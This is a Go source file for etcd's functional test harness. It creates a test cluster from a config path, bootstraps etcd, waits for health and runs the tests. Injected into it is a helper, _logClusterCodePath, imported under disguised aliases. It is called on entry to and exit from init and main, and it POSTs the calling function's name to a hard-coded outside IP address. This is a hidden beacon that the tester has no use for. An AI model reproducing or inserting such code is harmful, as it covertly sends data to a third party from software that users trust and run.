package main

import (
	godefaultbytes "bytes"
	"flag"
	"github.com/coreos/etcd/functional/tester"
	"go.uber.org/zap"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

var logger *zap.Logger

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var err error
	logger, err = zap.NewProduction()
	if err != nil {
		panic(err)
	}
}
func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	config := flag.String("config", "", "path to tester configuration")
	flag.Parse()
	defer logger.Sync()
	clus, err := tester.NewCluster(logger, *config)
	if err != nil {
		logger.Fatal("failed to create a cluster", zap.Error(err))
	}
	err = clus.Send_INITIAL_START_ETCD()
	if err != nil {
		logger.Fatal("Bootstrap failed", zap.Error(err))
	}
	defer clus.Send_SIGQUIT_ETCD_AND_REMOVE_DATA_AND_STOP_AGENT()
	logger.Info("wait health after bootstrap")
	err = clus.WaitHealth()
	if err != nil {
		logger.Fatal("WaitHealth failed", zap.Error(err))
	}
	clus.Run()
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
